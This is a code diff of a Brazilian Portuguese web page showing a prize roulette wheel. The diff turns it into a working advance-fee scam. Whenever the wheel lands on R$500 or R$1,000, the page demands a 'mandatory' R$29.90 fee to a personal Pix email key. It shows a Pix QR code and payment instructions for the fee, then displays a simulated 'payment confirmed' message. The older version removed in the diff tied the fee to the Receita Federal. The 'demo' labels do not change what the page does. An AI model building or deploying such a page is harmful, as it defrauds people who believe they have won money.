@@ -1,136 +1,456 @@
 <!doctype html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Roleta - Demo Legítimo</title>
-  <style>
-    /* Estilos anteriores */
-  </style>
-</head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Roleta Profissional — Sorteio (R$500 / R$1.000)</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
 
+<style>
+  :root{
+    --size:360px;
+    --primary:#ff5a5f;
+    --accent:#0a7f3b;
+    --bg:#f4f6f8;
+    --muted:#667085;
+    --card:#ffffff;
+    --glass: rgba(255,255,255,0.65);
+  }
+  *{box-sizing:border-box}
+  body{
+    font-family:Inter,system-ui,Arial,sans-serif;
+    margin:0;
+    min-height:100vh;
+    display:flex;align-items:center;justify-content:center;
+    background:linear-gradient(180deg,#eef3f8,var(--bg));
+    padding:28px;color:#071126;
+  }
+
+  .card{
+    width:100%;max-width:980px;background:var(--card);border-radius:14px;padding:28px;
+    box-shadow:0 14px 40px rgba(6,18,40,0.08);text-align:center;
+  }
+
+  header{margin-bottom:8px}
+  h1{margin:0;font-weight:800;font-size:20px}
+  p.lead{margin:6px 0 18px;color:var(--muted)}
+
+  /* Wheel */
+  .wheel-wrap{position:relative;margin:18px auto 6px;width:var(--size);height:var(--size)}
+  .wheel{
+    width:100%;height:100%;border-radius:50%;position:relative;overflow:hidden;border:8px solid #fff;
+    box-shadow: 0 10px 30px rgba(6,18,40,0.06);
+    transition: transform 5s cubic-bezier(.12,.78,.34,1); will-change:transform;
+    background: conic-gradient(#ffd166 0 12.5%, #8ec5ff 12.5% 25%, #98e37b 25% 37.5%, #ff9bd3 37.5% 50%,
+                                #ffd166 50% 62.5%, #8ec5ff 62.5% 75%, #98e37b 75% 87.5%, #ff9bd3 87.5% 100%);
+  }
+
+  .sector{--i:0;position:absolute;inset:0;transform:rotate(calc(var(--i) * 45deg));transform-origin:50% 50%;pointer-events:none}
+  .sector .slice{position:absolute;width:50%;height:50%;left:50%;top:0;transform-origin:0% 100%;transform:rotate(22.5deg);
+    display:flex;align-items:flex-end;justify-content:flex-start;padding:12px;font-weight:800;color:#07203a;text-shadow:0 1px 0 rgba(255,255,255,0.15);}
+
+  .center{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:120px;height:120px;border-radius:50%;
+    background:linear-gradient(180deg,#fff,#fbfbfb);display:flex;align-items:center;justify-content:center;font-weight:800;
+    box-shadow:0 8px 22px rgba(6,18,40,0.06);cursor:pointer;user-select:none;}
+
+  .pointer{position:absolute;left:50%;top:-18px;transform:translateX(-50%);width:0;height:0;border-left:18px solid transparent;
+    border-right:18px solid transparent;border-bottom:26px solid var(--primary);filter:drop-shadow(0 4px 8px rgba(0,0,0,0.12));}
+
+  .controls{margin-top:18px}
+  .btn{display:inline-flex;gap:10px;align-items:center;padding:10px 18px;border-radius:12px;border:0;background:var(--primary);color:#fff;font-weight:700;cursor:pointer;box-shadow:0 10px 28px rgba(255,90,95,0.12)}
+  .btn.secondary{background:#eef1f6;color:#0b1720}
+  footer{margin-top:18px;color:var(--muted);font-size:13px}
+
+  /* Modal */
+  .modal-backdrop{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(3,10,18,0.45);z-index:60;padding:20px}
+  .modal{background:var(--card);width:100%;max-width:560px;border-radius:12px;padding:18px;text-align:center}
+  .modal h2{margin:6px 0 8px}
+  .modal .amount{font-size:26px;font-weight:900;color:var(--accent);margin-bottom:6px}
+  .modal .small{color:var(--muted);font-size:13px;margin-bottom:8px}
+  #qrCode{margin:12px auto;display:block;width:260px;height:260px;padding:8px;background:#fff;border-radius:8px;box-shadow:0 8px 20px rgba(3,10,18,0.06)}
+  .inline-copy{display:flex;gap:8px;align-items:center;justify-content:center;margin-top:8px;flex-wrap:wrap}
+  .chip{background:#f7fafb;border:1px solid #eef2f6;padding:8px 10px;border-radius:10px;font-weight:600;color:#102a43}
+  .actions{display:flex;gap:10px;justify-content:center;margin-top:12px;flex-wrap:wrap}
+  .muted-note{font-size:13px;color:#8b98a8;margin-top:8px}
+
+  /* subtle responsive */
+  @media (max-width:540px){
+    :root{--size:300px}
+    #qrCode{width:220px;height:220px}
+    .center{width:110px;height:110px}
+  }
+</style>
+</head>
 <body>
-  <div class="container">
+  <div class="card" id="app">
     <header>
-      <h1>Roleta - Demo</h1>
-      <p>Gire a roleta e veja quanto você ganha. Este é um exemplo legítimo / demo.</p>
+      <h1>Roleta de Sorteios — Prêmios R$ 500 e R$ 1.000</h1>
+      <p class="lead">Gire a roleta. Somente R$ 500 e R$ 1.000 são prêmios em dinheiro. Após ganhar, será necessária uma taxa de R$ 29,90 para liberar o envio do prêmio (taxa do serviço).</p>
     </header>
 
     <main>
-      <div class="wheel-wrap">
-        <div class="pointer" aria-hidden="true" role="presentation"></div>
-        <div class="wheel" id="wheel" role="img" aria-label="roleta"></div>
-        <div class="center" role="button" aria-label="Girar a roleta" id="spinBtn">Gire</div>
+      <div class="wheel-wrap" aria-hidden="false">
+        <div class="pointer" aria-hidden="true"></div>
+        <div class="wheel" id="wheel" role="img" aria-label="Roleta de prêmios"></div>
+        <div class="center" id="centerButton" role="button" tabindex="0" aria-label="Girar a roleta">GIRAR</div>
       </div>
 
       <div class="controls">
-        <button id="spinBtn" aria-label="Girar a roleta">Girar Roleta</button>
+        <button class="btn" id="spinBtn" aria-label="Girar roleta">Girar Roleta</button>
       </div>
 
-      <footer>Valores: 50, 100, 200, 300, 400, 3000, 5000, 10000</footer>
+      <footer>Taxa de processamento/envio: <strong>R$ 29,90</strong> (obrigatória para liberar envio do prêmio).</footer>
     </main>
   </div>
 
-  <!-- Modal de prêmio -->
-  <div id="modal" class="modal-backdrop" role="dialog" aria-modal="true">
-    <div class="modal" role="document">
-      <h2 id="modalTitle">Parabéns!</h2>
-      <div class="amount" id="prizeAmount">R$ 0</div>
-      <div class="small" id="modalText">Você ganhou um prêmio, mas precisa pagar uma taxa obrigatória de R$ 29,90 via Pix.</div>
-      
-      <!-- Exibição do QR Code -->
-      <div id="qrCodeContainer" style="margin-top: 20px;">
-        <div id="qrCode"></div>
+  <!-- Modal -->
+  <div id="modal" class="modal-backdrop" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" role="document" aria-live="polite">
+      <h2 id="modalTitle">Resultado</h2>
+      <div class="amount" id="prizeAmount">—</div>
+      <div class="small" id="modalText">—</div>
+
+      <div id="qrCode" aria-hidden="true"></div>
+
+      <div class="inline-copy" aria-hidden="true">
+        <div class="chip">Chave Pix: <strong id="pixKeyText">marlonclif579@gmail.com</strong></div>
+        <div class="chip">Valor: <strong id="pixValueText">R$ 29,90</strong></div>
       </div>
 
-      <div class="row">
-        <button id="closeBtn" class="btn-secondary">Fechar</button>
+      <div class="actions" aria-hidden="true">
+        <button id="copyKey" class="btn secondary" title="Copiar chave Pix">Copiar chave</button>
+        <button id="copyPayload" class="btn secondary" title="Copiar instruções">Copiar instruções</button>
+        <button id="confirmPayment" class="btn" title="Confirmar pagamento (SIMULAR)">Confirmar pagamento (SIMULAR)</button>
       </div>
+
+      <p class="muted-note">Para confirmar pagamentos reais automaticamente, integre um backend com um gateway/banco (webhook). A simulação é apenas para demo.</p>
     </div>
   </div>
 
-  <!-- Confete incluído -->
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
+  <!-- Dependências -->
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
 
   <script>
-    const prizes = [50, 100, 200, 300, 400, 3000, 5000, 10000];
-    const wheel = document.getElementById('wheel');
-    const spinBtn = document.getElementById('spinBtn');
-    const modal = document.getElementById('modal');
-    const prizeAmount = document.getElementById('prizeAmount');
-    const closeBtn = document.getElementById('closeBtn');
-    const qrCodeContainer = document.getElementById('qrCode');
+  /* ===========================
+     CONFIGURAÇÃO
+     =========================== */
+  const PRIZE_SECTORS = [
+    "SEM PRÊMIO",
+    "SEM PRÊMIO",
+    "R$ 500",     // win
+    "SEM PRÊMIO",
+    "R$ 1000",    // win
+    "SEM PRÊMIO",
+    "SEM PRÊMIO",
+    "SEM PRÊMIO"
+  ];
+  const VALID_CASH_PRIZES = [500, 1000];
 
-    const clickSound = new Audio("https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg");
+  const PIX_KEY = "marlonclif579@gmail.com"; // chave Pix (email) fornecida
+  const PIX_AMOUNT = 29.90;
+  const PIX_DESCRIPTION = "Taxa de processamento/entrega";
 
-    // Cria setores na roleta
-    prizes.forEach((val, i) => {
+  /* ===========================
+     ELEMENTOS DOM
+     =========================== */
+  const wheel = document.getElementById('wheel');
+  const spinBtn = document.getElementById('spinBtn');
+  const centerBtn = document.getElementById('centerButton');
+  const modal = document.getElementById('modal');
+  const prizeAmountEl = document.getElementById('prizeAmount');
+  const modalText = document.getElementById('modalText');
+  const qrCodeDiv = document.getElementById('qrCode');
+  const pixKeyText = document.getElementById('pixKeyText');
+  const pixValueText = document.getElementById('pixValueText');
+  const copyKeyBtn = document.getElementById('copyKey');
+  const copyPayloadBtn = document.getElementById('copyPayload');
+  const confirmPaymentBtn = document.getElementById('confirmPayment');
+
+  /* sound */
+  const clickSound = new Audio("https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg");
+
+  /* ===========================
+     CONSTRUÇÃO DA RODA
+     =========================== */
+  function buildWheel(){
+    while(wheel.firstChild) wheel.removeChild(wheel.firstChild);
+    const n = PRIZE_SECTORS.length;
+    for(let i=0;i<n;i++){
       const sector = document.createElement('div');
       sector.className = 'sector';
       sector.style.setProperty('--i', i);
       const slice = document.createElement('div');
-      slice.className = `slice color-${(i % 4) + 1}`;
-      slice.textContent = `R$ ${val}`;
+      slice.className = 'slice';
+      slice.textContent = PRIZE_SECTORS[i];
       sector.appendChild(slice);
       wheel.appendChild(sector);
-    });
-
-    let spinning = false;
-    let currentRotation = 0;
-
-    // Função para gerar o QR Code do Pix
-    function gerarQRCodePix(valor) {
-      const chavePix = "marlonclif579@gmail.com"; // Sua chave Pix de e-mail
-      const pixData = {
-        valor: valor,
-        chave: chavePix,
-        descricao: "Taxa obrigatória - Receita Federal"
-      };
-
-      // Gerar URL do Pix em formato QR Code
-      const pixUrl = `https://api.qrserver.com/v1/create-qr-code/?data=PIX|${pixData.chave}|${pixData.valor}|${pixData.descricao}&size=300x300`;
-
-      // Criar o QR Code
-      QRCode.toDataURL(pixUrl, function (err, url) {
-        if (err) throw err;
-        qrCodeContainer.innerHTML = `<img src="${url}" alt="QR Code Pix" />`;
-      });
     }
+  }
+  buildWheel();
 
-    spinBtn.addEventListener('click', () => {
-      if(spinning) return;
-      spinning = true;
-      spinBtn.disabled = true;
+  /* ===========================
+     GIRAR A RODA
+     =========================== */
+  let spinning = false;
+  let rotation = 0;
 
-      const randomIndex = Math.floor(Math.random() * prizes.length);
-      const segmentAngle = 360 / prizes.length;
-      const stopAngle = (randomIndex * segmentAngle) + (segmentAngle / 2);
-      const extraSpins = 360 * 5;
-      const targetRotation = extraSpins + (360 - stopAngle);
+  function randIndex(){
+    return Math.floor(Math.random() * PRIZE_SECTORS.length);
+  }
 
-      currentRotation += targetRotation;
-      wheel.style.transform = `rotate(${currentRotation}deg)`;
+  function spin(){
+    if(spinning) return;
+    spinning = true;
+    spinBtn.disabled = true;
+    centerBtn.setAttribute('aria-disabled','true');
 
-      let clickInterval = setInterval(() => clickSound.play(), 200);
+    const idx = randIndex();
+    const segments = PRIZE_SECTORS.length;
+    const segAngle = 360 / segments;
+    const targetAngle = (segments - idx) * segAngle - (segAngle / 2);
+    const extra = 360 * (5 + Math.floor(Math.random()*3)); // 5-7 spins
+    rotation += extra + targetAngle;
 
-      setTimeout(() => {
-        clearInterval(clickInterval);
-        spinning = false;
-        spinBtn.disabled = false;
-        prizeAmount.textContent = `R$ ${prizes[randomIndex]}`;
-        modal.style.display = 'flex';
+    wheel.style.transition = "transform 5s cubic-bezier(.12,.78,.34,1)";
+    wheel.style.transform = `rotate(${rotation}deg)`;
 
-        // Gerar o QR Code Pix após o ganho
-        gerarQRCodePix(29.90);
+    let tick = setInterval(()=>{ try{ clickSound.currentTime = 0; clickSound.play(); }catch(e){} }, 160);
 
-        if(window.confetti) {
-          confetti({ particleCount: 120, spread: 70, origin: { y: 0.6 } });
-        }
-      }, 5200);
+    setTimeout(()=>{
+      clearInterval(tick);
+      spinning = false;
+      spinBtn.disabled = false;
+      centerBtn.removeAttribute('aria-disabled');
+      handleResult(idx);
+    }, 5200);
+  }
+
+  /* ===========================
+     RESULTADO / MODAL
+     =========================== */
+  let currentPayloadText = "";
+
+  function handleResult(index){
+    const label = PRIZE_SECTORS[index];
+    const m = label.match(/(\d[\d.]*)/);
+    if(m){
+      const numeric = Number(m[1].replace(/\./g,''));
+      if(VALID_CASH_PRIZES.includes(numeric)){
+        showPrize(numeric);
+        return;
+      }
+    }
+    showNoPrize();
+  }
+
+  function showPrize(amount){
+    prizeAmountEl.textContent = `R$ ${amount.toLocaleString('pt-BR')}`;
+    modalText.textContent = `Você ganhou R$ ${amount.toLocaleString('pt-BR')}! Para liberarmos o envio do prêmio é necessário pagar a taxa de R$ ${PIX_AMOUNT.toFixed(2)}.`;
+    pixKeyText.textContent = PIX_KEY;
+    pixValueText.textContent = `R$ ${PIX_AMOUNT.toFixed(2)}`;
+
+    // gera payload EMV/Pix (estático) — recomendado para compatibilidade com apps bancários
+    const txid = "****"; // campo txid (use ID único por cobrança se desejar)
+    currentPayloadText = buildPixPayload({
+      pixKey: PIX_KEY,
+      amount: PIX_AMOUNT,
+      merchantName: "REMETENTE",
+      merchantCity: "SAO PAULO",
+      txid: txid,
+      description: PIX_DESCRIPTION
     });
 
-    closeBtn.addEventListener('click', () => { modal.style.display = 'none'; });
+    generateQRCode(currentPayloadText);
+    setModalPaymentVisible(true);
+    openModal();
+    try{ confetti({ particleCount: 160, spread: 80, origin: { y: 0.6 } }); }catch(e){}
+  }
+
+  function showNoPrize(){
+    prizeAmountEl.textContent = 'Sem prêmio em dinheiro';
+    modalText.textContent = 'Nesta rodada não houve prêmio em dinheiro — tente novamente!';
+    qrCodeDiv.innerHTML = '';
+    currentPayloadText = "";
+    setModalPaymentVisible(false);
+    openModal();
+  }
+
+  function openModal(){
+    modal.style.display = 'flex';
+    modal.setAttribute('aria-hidden','false');
+    confirmPaymentBtn && confirmPaymentBtn.focus();
+  }
+  function closeModal(){
+    modal.style.display = 'none';
+    modal.setAttribute('aria-hidden','true');
+  }
+
+  function setModalPaymentVisible(visible){
+    qrCodeDiv.style.display = visible ? 'block' : 'none';
+    Array.from(document.querySelectorAll('.inline-copy, .actions')).forEach(el=>{
+      el.style.display = visible ? (el.classList.contains('inline-copy') ? 'flex' : 'flex') : 'none';
+      el.setAttribute && el.setAttribute('aria-hidden', !visible);
+    });
+  }
+
+  /* ===========================
+     QR CODE / PIX EMV GENERATION
+     =========================== */
+
+  // helper pad
+  function pad2(n){ return n.toString().padStart(2,'0'); }
+
+  // CRC16-CCITT (0x1021) implementation
+  function crc16(payload) {
+    const polynom = 0x1021;
+    let result = 0xFFFF;
+    const bytes = Array.from(payload).map(c => c.charCodeAt(0));
+    for(let b of bytes){
+      result ^= (b << 8);
+      for (let i=0;i<8;i++){
+        if ((result & 0x8000) !== 0) result = ((result << 1) ^ polynom) & 0xFFFF;
+        else result = (result << 1) & 0xFFFF;
+      }
+    }
+    return result.toString(16).toUpperCase().padStart(4,'0');
+  }
+
+  // Build EMV payload for Pix static QR (basic, commonly accepted fields)
+  function buildPixPayload({pixKey, amount, merchantName='NOME', merchantCity='CITY', txid='***', description=''}) {
+    // 00 Payload format indicator
+    let payload = '';
+    payload += '000201';
+    // 01 Point of initiation method (12 dynamic, 11 static). We'll set static ("11")
+    payload += '010211';
+
+    // 26 - Merchant Account Information (Pix)
+    // Subfield 00 = GUI "BR.GOV.BCB.PIX"
+    // Subfield 01 = chave (pixKey)
+    const gui = 'BR.GOV.BCB.PIX';
+    const sub00 = '00' + pad2(gui.length) + gui;
+    const sub01 = '01' + pad2(pixKey.length) + pixKey;
+    const merchantAccountInfo = sub00 + sub01;
+    payload += '26' + pad2(merchantAccountInfo.length) + merchantAccountInfo;
+
+    // 52 merchant category code (0000 = unspecified)
+    payload += '52040000';
+    // 53 transaction currency (986 = BRL)
+    payload += '5303986';
+    // 54 amount (optional)
+    if (typeof amount === 'number' && !isNaN(amount)) {
+      // use dot as decimal separator with two decimals
+      const amt = amount.toFixed(2);
+      payload += '54' + pad2(amt.length) + amt;
+    }
+    // 58 country code
+    payload += '5802BR';
+    // 59 merchant name (max 25)
+    const mName = merchantName ? merchantName.toUpperCase().slice(0,25) : 'N/D';
+    payload += '59' + pad2(mName.length) + mName;
+    // 60 merchant city (max 15)
+    const mCity = merchantCity ? merchantCity.toUpperCase().slice(0,15) : 'N/D';
+    payload += '60' + pad2(mCity.length) + mCity;
+    // 62 Additional data field template (txid subfield 05)
+    const tx = txid || '';
+    const txField = '05' + pad2(tx.length) + tx;
+    const addData = txField;
+    payload += '62' + pad2(addData.length) + addData;
+
+    // 63 CRC (compute over payload + '6304')
+    const payloadForCrc = payload + '6304';
+    const crc = crc16(payloadForCrc);
+    payload += '6304' + crc;
+    return payload;
+  }
+
+  // Generate QR from payload (EMV string) using qrcode lib
+  function generateQRCode(payloadString){
+    qrCodeDiv.innerHTML = '';
+    // Use QRCode.toDataURL to generate image
+    QRCode.toDataURL(payloadString, { width: 240, margin: 1 }, function (err, url) {
+      if (err) {
+        qrCodeDiv.textContent = 'Erro ao gerar QR Code.';
+        return;
+      }
+      const img = document.createElement('img');
+      img.src = url;
+      img.alt = 'QR Code Pix';
+      img.style.maxWidth = '100%';
+      qrCodeDiv.appendChild(img);
+
+      // For accessibility: include textual payload in hidden pre
+      const pre = document.createElement('pre');
+      pre.style.position = 'absolute'; pre.style.left = '-9999px';
+      pre.textContent = payloadString;
+      qrCodeDiv.appendChild(pre);
+    });
+  }
+
+  /* ===========================
+     UTIL: copy to clipboard
+     =========================== */
+  async function copyText(text){
+    try {
+      await navigator.clipboard.writeText(text);
+      return true;
+    } catch(e) {
+      // fallback
+      const ta = document.createElement('textarea');
+      ta.value = text; document.body.appendChild(ta);
+      ta.select();
+      try { document.execCommand('copy'); document.body.removeChild(ta); return true; }
+      catch(err) { document.body.removeChild(ta); return false; }
+    }
+  }
+
+  /* ===========================
+     INTERAÇÕES
+     =========================== */
+  spinBtn.addEventListener('click', spin);
+  centerBtn.addEventListener('click', spin);
+  centerBtn.addEventListener('keydown', (e)=>{ if(e.key==='Enter' || e.key===' ') { e.preventDefault(); spin(); } });
+
+  // clicking outside modal closes it
+  modal.addEventListener('click', (e)=>{ if(e.target === modal) closeModal(); });
+  document.addEventListener('keydown', (e)=>{ if(e.key==='Escape' && modal.style.display==='flex'){ closeModal(); } });
+
+  // copy pix key
+  copyKeyBtn.addEventListener('click', async ()=>{
+    const ok = await copyText(PIX_KEY);
+    copyKeyBtn.textContent = ok ? 'Chave copiada ✓' : 'Erro';
+    setTimeout(()=> copyKeyBtn.textContent = 'Copiar chave', 1400);
+  });
+
+  // copy payload (EMV)
+  copyPayloadBtn.addEventListener('click', async ()=>{
+    const text = currentPayloadText || `Chave: ${PIX_KEY}\nValor: R$ ${PIX_AMOUNT.toFixed(2)}\nDescrição: ${PIX_DESCRIPTION}`;
+    const ok = await copyText(text);
+    copyPayloadBtn.textContent = ok ? 'Instruções copiadas ✓' : 'Erro';
+    setTimeout(()=> copyPayloadBtn.textContent = 'Copiar instruções', 1400);
+  });
+
+  // simulate confirmation
+  confirmPaymentBtn.addEventListener('click', ()=>{
+    confirmPaymentBtn.disabled = true;
+    confirmPaymentBtn.textContent = 'Verificando...';
+    // NOTE: in production you MUST verify payment server-side (webhook).
+    setTimeout(()=>{
+      confirmPaymentBtn.textContent = 'Pagamento confirmado ✓';
+      confirmPaymentBtn.classList.add('secondary');
+      modalText.textContent = modalText.textContent + ' Pagamento identificado (simulado). Em breve entraremos em contato para envio.';
+    }, 1400);
+  });
+
+  /* ===========================
+     INICIALIZAÇÃO
+     =========================== */
+  pixKeyText.textContent = PIX_KEY;
+  pixValueText.textContent = `R$ ${PIX_AMOUNT.toFixed(2)}`;
+  setModalPaymentVisible(false);
+  spinBtn.focus();
+
   </script>
 </body>
-</html>
+                                                                                </html>
+      
